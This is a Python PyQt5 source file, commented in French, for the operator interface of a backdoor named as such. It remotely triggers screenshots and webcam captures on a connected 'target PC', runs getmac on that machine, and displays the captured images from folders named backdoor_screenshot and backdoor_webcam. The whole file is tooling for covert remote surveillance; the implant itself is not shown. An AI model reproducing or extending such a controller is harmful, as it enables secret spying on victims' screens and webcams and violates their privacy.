from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QPushButton, QLabel, 
                             QScrollArea, QGridLayout, QHBoxLayout, 
                             QFrame, QSizePolicy, QDialog, QTabWidget, QMessageBox, QFileDialog)
from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QPixmap, QFont
from core.screenshot_handler import ScreenshotHandler
import os
import datetime
import unicodedata
import re

class ScreenshotTab(QWidget):
    def __init__(self, connection_tab):
        super().__init__()
        self.connection_tab = connection_tab
        self.screenshot_items = []  # Pour stocker les références aux widgets
        self.init_ui()
        
    def normalize_mac_address(self, mac_address):
        """Normalise une adresse MAC en supprimant les caractères spéciaux"""
        # Remplacer les caractères non-alphanumériques par des underscores
        mac_address = re.sub(r'[^a-zA-Z0-9_-]', '_', mac_address)
        
        return mac_address

    def init_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Onglets pour séparer les captures d'écran et webcam
        self.tab_widget = QTabWidget()
        
        # Tab pour les captures d'écran
        self.screen_tab = QWidget()
        self.init_screen_tab()
        self.tab_widget.addTab(self.screen_tab, "Captures d'écran")
        
        # Tab pour les captures webcam
        self.webcam_tab = QWidget()
        self.init_webcam_tab()
        self.tab_widget.addTab(self.webcam_tab, "Captures webcam")
        
        layout.addWidget(self.tab_widget)
        self.setLayout(layout)

    def init_screen_tab(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Contrôles supérieurs
        controls_layout = QHBoxLayout()
        
        self.status_label = QLabel("Cliquez sur le bouton pour capturer l'écran.")
        self.status_label.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        self.capture_button = QPushButton("Capturer l'écran")
        self.capture_button.clicked.connect(self.capture_screenshot)
        
        self.refresh_button = QPushButton("Rafraîchir les captures")
        self.refresh_button.clicked.connect(self.refresh_screenshots)
        
        controls_layout.addWidget(self.status_label)
        controls_layout.addWidget(self.capture_button)
        controls_layout.addWidget(self.refresh_button)
        
        layout.addLayout(controls_layout)
        
        # Zone de défilement pour les screenshots
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)  # Désactiver la scrollbar horizontale
        
        self.screenshots_container = QWidget()
        self.screenshots_layout = QGridLayout(self.screenshots_container)
        self.screenshots_layout.setContentsMargins(5, 5, 5, 5)
        
        self.scroll_area.setWidget(self.screenshots_container)
        layout.addWidget(self.scroll_area)
        
        self.screen_tab.setLayout(layout)
        
    def init_webcam_tab(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Contrôles supérieurs
        controls_layout = QHBoxLayout()
        
        self.webcam_status_label = QLabel("Cliquez sur le bouton pour capturer une image de la webcam.")
        self.webcam_status_label.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        self.webcam_capture_button = QPushButton("Capturer la webcam")
        self.webcam_capture_button.clicked.connect(self.capture_webcam)
        
        self.webcam_refresh_button = QPushButton("Rafraîchir les captures")
        self.webcam_refresh_button.clicked.connect(self.refresh_webcam_images)
        
        controls_layout.addWidget(self.webcam_status_label)
        controls_layout.addWidget(self.webcam_capture_button)
        controls_layout.addWidget(self.webcam_refresh_button)
        
        layout.addLayout(controls_layout)
        
        # Zone de défilement pour les captures webcam
        self.webcam_scroll_area = QScrollArea()
        self.webcam_scroll_area.setWidgetResizable(True)
        self.webcam_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        
        self.webcam_container = QWidget()
        self.webcam_layout = QGridLayout(self.webcam_container)
        self.webcam_layout.setContentsMargins(5, 5, 5, 5)
        
        self.webcam_scroll_area.setWidget(self.webcam_container)
        layout.addWidget(self.webcam_scroll_area)
        
        self.webcam_items = []  # Pour stocker les références aux widgets webcam
        self.webcam_tab.setLayout(layout)

    def capture_screenshot(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return

        handler = ScreenshotHandler(self.connection_tab.client_handler)
        result = handler.capture()
        self.status_label.setText(result)
        
        # Rafraîchir la liste des screenshots après en avoir capturé un nouveau
        self.refresh_screenshots()
        
    def capture_webcam(self):
        if not self.connection_tab.client_handler:
            self.webcam_status_label.setText("[!] Pas de connexion active.")
            return

        handler = ScreenshotHandler(self.connection_tab.client_handler)
        result = handler.capture_webcam()
        self.webcam_status_label.setText(result)
        
        # Rafraîchir la liste des captures webcam après en avoir capturé une nouvelle
        self.refresh_webcam_images()

    def refresh_screenshots(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        # Vider la liste des références
        self.screenshot_items = []
        
        # Effacer la disposition existante
        self._clear_layout(self.screenshots_layout)

        try:
            # Récupérer l'adresse MAC du client actuellement connecté
            mac_address = self._get_connected_mac_address()
            
            if not mac_address:
                self.status_label.setText("[!] Impossible de déterminer l'adresse MAC du PC cible.")
                return
                
            # Chemin du dossier parent pour les screenshots
            parent_dir = os.path.join(os.getenv('APPDATA'), "backdoor_screenshot")
            
            print(f"MAC récupérée: {mac_address}")
            print(f"MAC normalisée: {self.normalize_mac_address(mac_address)}")
            
            if not os.path.exists(parent_dir):
                self.status_label.setText(f"Dossier de captures d'écran introuvable.")
                return
                
            # Lister tous les dossiers disponibles
            print("Dossiers disponibles:")
            for dir_name in os.listdir(parent_dir):
                if os.path.isdir(os.path.join(parent_dir, dir_name)):
                    print(f"  - {dir_name} (normalisé: {self.normalize_mac_address(dir_name)})")
            
            # Rechercher le bon dossier pour cette adresse MAC, quelle que soit la normalisation
            screenshots_dir = None
            
            # 1. Essayer avec l'adresse MAC directe
            direct_path = os.path.join(parent_dir, mac_address)
            if os.path.exists(direct_path):
                screenshots_dir = direct_path
                print(f"Dossier trouvé avec l'adresse MAC directe: {direct_path}")
            else:
                # 2. Essayer avec l'adresse MAC normalisée
                normalized_mac = self.normalize_mac_address(mac_address)
                normalized_path = os.path.join(parent_dir, normalized_mac)
                
                if os.path.exists(normalized_path):
                    screenshots_dir = normalized_path
                    print(f"Dossier trouvé avec l'adresse MAC normalisée: {normalized_path}")
                else:
                    # 3. Parcourir tous les dossiers existants et comparer
                    for dir_name in os.listdir(parent_dir):
                        dir_path = os.path.join(parent_dir, dir_name)
                        if os.path.isdir(dir_path):
                            # Comparer les deux versions normalisées
                            if self.normalize_mac_address(dir_name).lower() == normalized_mac.lower():
                                screenshots_dir = dir_path
                                print(f"Dossier trouvé par normalisation: {dir_path}")
                                break
                            
                            # Vérifier si l'un contient l'autre après normalisation
                            if self.similar_mac_address(mac_address, dir_name):
                                screenshots_dir = dir_path
                                print(f"Dossier trouvé par similarité: {dir_path}")
                                break
            
            if not screenshots_dir or not os.path.exists(screenshots_dir):
                self.status_label.setText(f"Aucun dossier de captures trouvé pour {mac_address}")
                
                # Option pour sélectionner manuellement le dossier
                reply = QMessageBox.question(self, 'Dossier non trouvé', 
                                            f"Aucun dossier correspondant à {mac_address} n'a été trouvé.\n"
                                            f"Voulez-vous sélectionner manuellement le dossier?",
                                            QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
                
                if reply == QMessageBox.Yes:
                    screenshots_dir = QFileDialog.getExistingDirectory(self, 
                                        "Sélectionner le dossier de captures d'écran", 
                                        parent_dir)
                    if not screenshots_dir:
                        return
                else:
                    return
                
            # Lister tous les fichiers screenshots
            screenshots = [f for f in os.listdir(screenshots_dir) if f.endswith('.png')]
            
            if not screenshots:
                self.status_label.setText(f"Aucune capture d'écran trouvée pour {mac_address}")
                return
                
            # Trier les screenshots par date (plus récent en premier)
            screenshots.sort(reverse=True, key=lambda x: os.path.getmtime(os.path.join(screenshots_dir, x)))
            
            # Créer les éléments
            for screenshot in screenshots:
                screenshot_path = os.path.join(screenshots_dir, screenshot)
                item = self._create_screenshot_item(screenshot_path, screenshot)
                self.screenshot_items.append(item)
            
            # Organiser les éléments en grille
            self._arrange_items(self.screenshots_layout, self.screenshot_items, self.scroll_area)
                    
            self.status_label.setText(f"{len(screenshots)} capture(s) d'écran trouvée(s) pour {mac_address}")
            
        except Exception as e:
            self.status_label.setText(f"[!] Erreur lors du chargement des captures: {str(e)}")
            print(f"Exception détaillée: {str(e)}")
            import traceback
            traceback.print_exc()

    # Appliquez la même logique à la méthode refresh_webcam_images()
    def refresh_webcam_images(self):
        if not self.connection_tab.client_handler:
            self.webcam_status_label.setText("[!] Pas de connexion active.")
            return
            
        # Vider la liste des références
        self.webcam_items = []
        
        # Effacer la disposition existante
        self._clear_layout(self.webcam_layout)

        try:
            # Récupérer l'adresse MAC du client actuellement connecté
            mac_address = self._get_connected_mac_address()
            
            if not mac_address:
                self.webcam_status_label.setText("[!] Impossible de déterminer l'adresse MAC du PC cible.")
                return
                
            # Chemin du dossier parent pour les captures webcam
            parent_dir = os.path.join(os.getenv('APPDATA'), "backdoor_webcam")
            
            print(f"MAC récupérée: {mac_address}")
            print(f"MAC normalisée: {self.normalize_mac_address(mac_address)}")
            
            if not os.path.exists(parent_dir):
                self.webcam_status_label.setText(f"Dossier de captures webcam introuvable.")
                return
                
            # Lister tous les dossiers disponibles
            print("Dossiers disponibles:")
            for dir_name in os.listdir(parent_dir):
                if os.path.isdir(os.path.join(parent_dir, dir_name)):
                    print(f"  - {dir_name} (normalisé: {self.normalize_mac_address(dir_name)})")
            
            # Rechercher le bon dossier pour cette adresse MAC, quelle que soit la normalisation
            webcam_dir = None
            
            # 1. Essayer avec l'adresse MAC directe
            direct_path = os.path.join(parent_dir, mac_address)
            if os.path.exists(direct_path):
                webcam_dir = direct_path
                print(f"Dossier trouvé avec l'adresse MAC directe: {direct_path}")
            else:
                # 2. Essayer avec l'adresse MAC normalisée
                normalized_mac = self.normalize_mac_address(mac_address)
                normalized_path = os.path.join(parent_dir, normalized_mac)
                
                if os.path.exists(normalized_path):
                    webcam_dir = normalized_path
                    print(f"Dossier trouvé avec l'adresse MAC normalisée: {normalized_path}")
                else:
                    # 3. Parcourir tous les dossiers existants et comparer
                    for dir_name in os.listdir(parent_dir):
                        dir_path = os.path.join(parent_dir, dir_name)
                        if os.path.isdir(dir_path):
                            # Comparer les deux versions normalisées
                            if self.normalize_mac_address(dir_name).lower() == normalized_mac.lower():
                                webcam_dir = dir_path
                                print(f"Dossier trouvé par normalisation: {dir_path}")
                                break
                            
                            # Vérifier si l'un contient l'autre après normalisation
                            if self.similar_mac_address(mac_address, dir_name):
                                webcam_dir = dir_path
                                print(f"Dossier trouvé par similarité: {dir_path}")
                                break
            
            if not webcam_dir or not os.path.exists(webcam_dir):
                self.webcam_status_label.setText(f"Aucun dossier de captures webcam trouvé pour {mac_address}")
                
                # Option pour sélectionner manuellement le dossier
                reply = QMessageBox.question(self, 'Dossier non trouvé', 
                                            f"Aucun dossier correspondant à {mac_address} n'a été trouvé.\n"
                                            f"Voulez-vous sélectionner manuellement le dossier?",
                                            QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
                
                if reply == QMessageBox.Yes:
                    webcam_dir = QFileDialog.getExistingDirectory(self, 
                                    "Sélectionner le dossier de captures webcam", 
                                    parent_dir)
                    if not webcam_dir:
                        return
                else:
                    return
                
            # Lister tous les fichiers de captures webcam
            webcam_images = [f for f in os.listdir(webcam_dir) if f.endswith('.jpg')]
            
            if not webcam_images:
                self.webcam_status_label.setText(f"Aucune capture webcam trouvée pour {mac_address}")
                return
                
            # Trier les captures webcam par date (plus récent en premier)
            webcam_images.sort(reverse=True, key=lambda x: os.path.getmtime(os.path.join(webcam_dir, x)))
            
            # Créer les éléments
            for image in webcam_images:
                image_path = os.path.join(webcam_dir, image)
                item = self._create_webcam_item(image_path, image)
                self.webcam_items.append(item)
            
            # Organiser les éléments en grille
            self._arrange_items(self.webcam_layout, self.webcam_items, self.webcam_scroll_area)
                    
            self.webcam_status_label.setText(f"{len(webcam_images)} capture(s) webcam trouvée(s) pour {mac_address}")
            
        except Exception as e:
            self.webcam_status_label.setText(f"[!] Erreur lors du chargement des captures webcam: {str(e)}")
            print(f"Exception détaillée: {str(e)}")
            import traceback
            traceback.print_exc()

    # Fonction pour comparer les adresses MAC
    def similar_mac_address(self, mac1, mac2):
        """Compare deux adresses MAC en ignorant les caractères spéciaux et la casse"""
        # Afficher pour debug
        print(f"Comparaison de MAC: {mac1} vs {mac2}")
        
        # Normaliser les deux adresses MAC
        norm1 = self.normalize_mac_address(mac1).lower()
        norm2 = self.normalize_mac_address(mac2).lower()
        
        print(f"  Normalisées: {norm1} vs {norm2}")
        
        # Vérification parfaite
        if norm1 == norm2:
            print("  Match parfait!")
            return True
            
        # Vérifier si l'un est contenu dans l'autre (pour les cas partiels)
        if norm1 in norm2 or norm2 in norm1:
            print("  Match partiel (contenu)!")
            return True
            
        # Calcul de similarité plus avancé pour MAC
        # Retirer tous les caractères non hexadécimaux
        clean1 = re.sub(r'[^a-fA-F0-9]', '', mac1).lower()
        clean2 = re.sub(r'[^a-fA-F0-9]', '', mac2).lower()
        
        print(f"  Nettoyées: {clean1} vs {clean2}")
        
        if clean1 == clean2:
            print("  Match après nettoyage!")
            return True
        
        # Comparer les 6 derniers caractères (moins de chance de collision)
        if len(clean1) >= 6 and len(clean2) >= 6:
            if clean1[-6:] == clean2[-6:]:
                print("  Match sur les 6 derniers caractères!")
                return True
        
        print("  Pas de correspondance")
        return False

    def _clear_layout(self, layout):
        """Efface tous les widgets du layout"""
        while layout.count():
            item = layout.takeAt(0)
            widget = item.widget()
            if widget is not None:
                widget.deleteLater()

    def _create_screenshot_item(self, image_path, image_name):
        """Crée un widget pour une capture d'écran avec ses informations"""
        # Créer un cadre pour contenir l'image et les informations
        frame = QFrame()
        frame.setFrameShape(QFrame.Box)
        frame.setFrameShadow(QFrame.Raised)
        frame.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        container_layout = QVBoxLayout(frame)
        
        # Créer un QLabel pour l'image
        image_label = QLabel()
        image_label.setAlignment(Qt.AlignCenter)
        
        # Charger et redimensionner l'image
        pixmap = QPixmap(image_path)
        
        # On sauvegarde le pixmap original pour pouvoir ajuster la taille plus tard
        image_label.setProperty("original_pixmap", pixmap)
        image_label.setProperty("image_path", image_path)
        
        # Taille initiale
        scaled_pixmap = pixmap.scaled(QSize(250, 180), Qt.KeepAspectRatio, Qt.SmoothTransformation)
        image_label.setPixmap(scaled_pixmap)
        image_label.setMinimumSize(250, 180)
        image_label.setMaximumSize(400, 300)
        
        # Activer le suivi de la souris pour l'image pour pouvoir détecter les clics
        image_label.setMouseTracking(True)
        image_label.mousePressEvent = lambda event: self.open_image_viewer(image_path)
        
        # Extraire les informations du nom de fichier
        # Format attendu: IP_MAC_ADDRESS_YYYYMMDD-HHMMSS-mss.png
        try:
            parts = image_name.split('_')
            ip = parts[0]
            mac_address = parts[1]
            
            # Extraire la date et l'heure
            timestamp_part = parts[2].split('.')[0]  # Enlever l'extension .png
            date_str, time_str = timestamp_part.split('-', 1)
            
            # Formater la date et l'heure
            try:
                year = date_str[:4]
                month = date_str[4:6]
                day = date_str[6:8]
                hour = time_str[:2]
                minute = time_str[2:4]
                second = time_str[4:6]
                
                formatted_date = f"{day}/{month}/{year} {hour}:{minute}:{second}"
            except:
                # Fallback si le format n'est pas celui attendu
                formatted_date = timestamp_part
                
            # Création du panneau d'information
            info_frame = QFrame()
            info_layout = QVBoxLayout(info_frame)
            info_layout.setSpacing(2)
            info_layout.setContentsMargins(5, 5, 5, 5)
            
            # Labels pour les informations
            ip_label = QLabel(f"IP: {ip}")
            
            mac_label = QLabel(f"MAC: {mac_address}")
            
            date_label = QLabel(f"Date: {formatted_date}")
            
            # Ajouter les informations au panneau
            info_layout.addWidget(ip_label)
            info_layout.addWidget(mac_label)
            info_layout.addWidget(date_label)
            
        except Exception as e:
            # Si erreur dans le parsing du nom de fichier, afficher le nom simplement
            info_frame = QFrame()
            info_layout = QVBoxLayout(info_frame)
            
            name_label = QLabel(image_name)
            name_label.setWordWrap(True)
            info_layout.addWidget(name_label)
        
        # Ajouter l'image et les informations au container
        container_layout.addWidget(image_label)
        container_layout.addWidget(info_frame)
        
        return frame
        
    def _create_webcam_item(self, image_path, image_name):
        """Crée un widget pour une capture webcam avec ses informations"""
        # Créer un cadre pour contenir l'image et les informations
        frame = QFrame()
        frame.setFrameShape(QFrame.Box)
        frame.setFrameShadow(QFrame.Raised)
        frame.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        container_layout = QVBoxLayout(frame)
        
        # Créer un QLabel pour l'image
        image_label = QLabel()
        image_label.setAlignment(Qt.AlignCenter)
        
        # Charger et redimensionner l'image
        pixmap = QPixmap(image_path)
        
        # On sauvegarde le pixmap original pour pouvoir ajuster la taille plus tard
        image_label.setProperty("original_pixmap", pixmap)
        image_label.setProperty("image_path", image_path)
        
        # Taille initiale
        scaled_pixmap = pixmap.scaled(QSize(250, 180), Qt.KeepAspectRatio, Qt.SmoothTransformation)
        image_label.setPixmap(scaled_pixmap)
        image_label.setMinimumSize(250, 180)
        image_label.setMaximumSize(400, 300)
        
        # Activer le suivi de la souris pour l'image pour pouvoir détecter les clics
        image_label.setMouseTracking(True)
        image_label.mousePressEvent = lambda event: self.open_image_viewer(image_path)
        
        # Extraire les informations du nom de fichier
        # Format attendu: webcam_IP_MAC_ADDRESS_YYYYMMDD-HHMMSS-mss.jpg
        try:
            parts = image_name.split('_')
            ip = parts[1]
            mac_address = parts[2]
            
            # Extraire la date et l'heure
            timestamp_part = parts[3].split('.')[0]  # Enlever l'extension .jpg
            date_str, time_str = timestamp_part.split('-', 1)
            
            # Formater la date et l'heure
            try:
                year = date_str[:4]
                month = date_str[4:6]
                day = date_str[6:8]
                hour = time_str[:2]
                minute = time_str[2:4]
                second = time_str[4:6]
                
                formatted_date = f"{day}/{month}/{year} {hour}:{minute}:{second}"
            except:
                # Fallback si le format n'est pas celui attendu
                formatted_date = timestamp_part
                
            # Création du panneau d'information
            info_frame = QFrame()
            info_layout = QVBoxLayout(info_frame)
            info_layout.setSpacing(2)
            info_layout.setContentsMargins(5, 5, 5, 5)
            
            # Labels pour les informations
            ip_label = QLabel(f"IP: {ip}")
            
            mac_label = QLabel(f"MAC: {mac_address}")
            
            date_label = QLabel(f"Date: {formatted_date}")
            
            # Ajouter les informations au panneau
            info_layout.addWidget(ip_label)
            info_layout.addWidget(mac_label)
            info_layout.addWidget(date_label)
            
        except Exception as e:
            # Si erreur dans le parsing du nom de fichier, afficher le nom simplement
            info_frame = QFrame()
            info_layout = QVBoxLayout(info_frame)
            
            name_label = QLabel(image_name)
            name_label.setWordWrap(True)
            info_layout.addWidget(name_label)
        
        # Ajouter l'image et les informations au container
        container_layout.addWidget(image_label)
        container_layout.addWidget(info_frame)
        
        return frame
    
    def open_image_viewer(self, image_path):
        """Ouvre la visionneuse d'image pour l'image sélectionnée"""
        viewer = ImageViewer(image_path, self)
        viewer.exec_()

    def _arrange_items(self, layout, items, scroll_area):
        """Arrange les éléments dans la grille en fonction de la largeur disponible"""
        if not items:
            return
            
        # Déterminer le nombre de colonnes en fonction de la largeur
        width = scroll_area.viewport().width() - 40  # Tenir compte des marges
        
        # Taille approximative d'un élément + espacement
        item_width = 300  # 250px pour l'image + marges
        
        # Calculer le nombre de colonnes qui tiennent dans la largeur disponible
        num_cols = max(1, width // item_width)
        
        # Placer les éléments dans la grille
        row, col = 0, 0
        for item in items:
            layout.addWidget(item, row, col)
            
            col += 1
            if col >= num_cols:
                col = 0
                row += 1
        
        # S'assurer que toutes les colonnes ont le même poids
        for i in range(num_cols):
            layout.setColumnStretch(i, 1)

    def _get_connected_mac_address(self):
        try:
            result = self.connection_tab.client_handler.send_command("getmac")
            
            # Affichage pour debug
            print("Résultat de getmac:", result)
            
            if result and not result.startswith("[!]"):
                # Parcourir chaque ligne pour trouver l'adresse MAC
                found_mac = None
                for line in result.strip().split('\n'):
                    # Rechercher des motifs d'adresse MAC (xx:xx:xx:xx:xx:xx ou xx-xx-xx-xx-xx-xx)
                    mac_pattern1 = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    mac_pattern2 = re.search(r'([0-9A-Fa-f]{2}-){5}([0-9A-Fa-f]{2})', line)
                    
                    if mac_pattern1:
                        found_mac = mac_pattern1.group(0)
                        print(f"MAC trouvée (format xx:xx): {found_mac}")
                        break
                    elif mac_pattern2:
                        found_mac = mac_pattern2.group(0)
                        print(f"MAC trouvée (format xx-xx): {found_mac}")
                        break
                
                if found_mac:
                    return found_mac
                    
                # Si aucune correspondance régulière, utiliser l'ancienne méthode comme fallback
                print("Utilisation de la méthode fallback pour trouver la MAC")
                for line in result.strip().split('\n'):
                    if '\\' not in line and (':' in line or '-' in line):
                        parts = line.split()
                        for part in parts:
                            if ':' in part or '-' in part:
                                print(f"MAC fallback trouvée: {part.strip()}")
                                return part.strip()
                
            # Si on ne peut pas obtenir l'adresse MAC, utiliser l'IP
            ip = self.connection_tab.client_handler.ip
            print(f"Aucune MAC trouvée, utilisation de l'IP: {ip}")
            return ip
            
        except Exception as e:
            print(f"Erreur lors de la récupération de l'adresse MAC: {str(e)}")
            return "Unknown"
            
    def resizeEvent(self, event):
        """Réorganise les éléments lorsque la fenêtre est redimensionnée"""
        super().resizeEvent(event)
        # Délai court pour permettre à la zone de défilement de mettre à jour sa taille
        from PyQt5.QtCore import QTimer
        QTimer.singleShot(50, lambda: self._arrange_items(self.screenshots_layout, self.screenshot_items, self.scroll_area))
        QTimer.singleShot(50, lambda: self._arrange_items(self.webcam_layout, self.webcam_items, self.webcam_scroll_area))

class ImageViewer(QDialog):
    def __init__(self, image_path, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Visionneuse de captures d'écran")
        self.setGeometry(100, 100, 800, 600)
        
        # Créer le layout principal
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Variables pour le déplacement de l'image
        self.panning = False
        self.last_pos = None
        
        # Créer un widget QLabel pour contenir l'image
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setMouseTracking(True)
        
        # Installer les filtres d'événements pour capturer les événements souris
        self.image_label.installEventFilter(self)
        
        # Créer un widget central pour contenir le label d'image
        self.central_widget = QWidget()
        central_layout = QVBoxLayout(self.central_widget)
        central_layout.addWidget(self.image_label)
        central_layout.setContentsMargins(0, 0, 0, 0)
        
        # Créer la zone de défilement pour l'image
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setWidget(self.central_widget)
        
        # Désactiver les barres de défilement
        self.scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        
        # Charger l'image
        self.pixmap = QPixmap(image_path)
        self.original_pixmap = self.pixmap
        
        # Ajouter le défilement à la disposition
        layout.addWidget(self.scroll_area)
        
        # Ajouter les contrôles de zoom
        controls_layout = QHBoxLayout()
        
        zoom_in_btn = QPushButton("Zoom +")
        zoom_in_btn.clicked.connect(self.zoom_in)
        
        zoom_out_btn = QPushButton("Zoom -")
        zoom_out_btn.clicked.connect(self.zoom_out)
        
        reset_btn = QPushButton("Réinitialiser")
        reset_btn.clicked.connect(self.reset_zoom)
        
        fit_btn = QPushButton("Ajuster")
        fit_btn.clicked.connect(self.fit_to_window)
        
        self.zoom_level = 1.0
        self.zoom_info = QLabel(f"Zoom: 100%")
        
        controls_layout.addWidget(zoom_in_btn)
        controls_layout.addWidget(zoom_out_btn)
        controls_layout.addWidget(reset_btn)
        controls_layout.addWidget(fit_btn)
        controls_layout.addWidget(self.zoom_info)
        
        layout.addLayout(controls_layout)
                
        # Ajuster l'image à la fenêtre lors de l'ouverture
        self.fit_to_window()
    
    def showEvent(self, event):
        """Appelé lorsque la fenêtre est affichée"""
        super().showEvent(event)
        # Ajuster l'image à la fenêtre lors de l'ouverture
        self.fit_to_window()
    
    def resizeEvent(self, event):
        """Ajuster l'image quand la fenêtre est redimensionnée"""
        super().resizeEvent(event)
        # Si l'ajustement automatique est activé, réajuster l'image
        if hasattr(self, 'fit_mode') and self.fit_mode:
            self.fit_to_window()
    
    def zoom_in(self):
        self.fit_mode = False
        self.zoom_level *= 1.25
        self.update_zoom()
    
    def zoom_out(self):
        self.fit_mode = False
        self.zoom_level *= 0.8
        self.update_zoom()
    
    def reset_zoom(self):
        self.fit_mode = False
        self.zoom_level = 1.0
        self.update_zoom()
    
    def fit_to_window(self):
        """Ajuste l'image à la taille de la fenêtre"""
        self.fit_mode = True
        
        # Calculer les dimensions disponibles
        viewport_width = self.scroll_area.viewport().width()
        viewport_height = self.scroll_area.viewport().height()
        
        # Calculer le ratio pour ajuster l'image dans la fenêtre
        img_width = self.original_pixmap.width()
        img_height = self.original_pixmap.height()
        
        width_ratio = viewport_width / img_width
        height_ratio = viewport_height / img_height
        
        # Utiliser le plus petit ratio pour s'assurer que l'image tient entièrement
        self.zoom_level = min(width_ratio, height_ratio) * 0.95  # Marge de 5%
        
        self.update_zoom()
        self.zoom_info.setText(f"Zoom: {int(self.zoom_level * 100)}%")
    
    def update_zoom(self):
        """Met à jour l'affichage avec le niveau de zoom actuel"""
        # Mettre à jour l'affichage du niveau de zoom
        self.zoom_info.setText(f"Zoom: {int(self.zoom_level * 100)}%")
        
        # Calculer la nouvelle taille
        new_width = int(self.original_pixmap.width() * self.zoom_level)
        new_height = int(self.original_pixmap.height() * self.zoom_level)
        
        # Mettre à jour l'image
        scaled_pixmap = self.original_pixmap.scaled(new_width, new_height, 
                                                   Qt.KeepAspectRatio, 
                                                   Qt.SmoothTransformation)
        self.image_label.setPixmap(scaled_pixmap)
        
        # Ajuster la taille du label
        self.image_label.resize(new_width, new_height)

    def wheelEvent(self, event):
        """Gérer le zoom avec la molette de la souris"""
        self.fit_mode = False
        delta = event.angleDelta().y()
        
        # Calculer le facteur de zoom en fonction de la vitesse de rotation
        zoom_factor = 1.1 if delta > 0 else 0.9
        
        # Appliquer le zoom
        self.zoom_level *= zoom_factor
        self.update_zoom()
    
    def eventFilter(self, source, event):
        """Filtre d'événements pour gérer le déplacement de l'image"""
        if source == self.image_label:
            # Démarrer le déplacement lors d'un clic droit
            if event.type() == event.MouseButtonPress and event.button() == Qt.RightButton:
                self.panning = True
                self.last_pos = event.pos()
                self.setCursor(Qt.ClosedHandCursor)
                return True
                
            # Arrêter le déplacement lors du relâchement du bouton
            elif event.type() == event.MouseButtonRelease and event.button() == Qt.RightButton:
                self.panning = False
                self.setCursor(Qt.ArrowCursor)
                return True
                
            # Effectuer le déplacement lors du mouvement de la souris
            elif event.type() == event.MouseMove and self.panning:
                delta = event.pos() - self.last_pos
                
                # Calculer la nouvelle position de l'image
                current_pos = self.central_widget.pos()
                new_x = current_pos.x() + delta.x()
                new_y = current_pos.y() + delta.y()
                
                # Déplacer l'image
                self.central_widget.move(new_x, new_y)
                self.last_pos = event.pos()
                return True
                
        return super().eventFilter(source, event)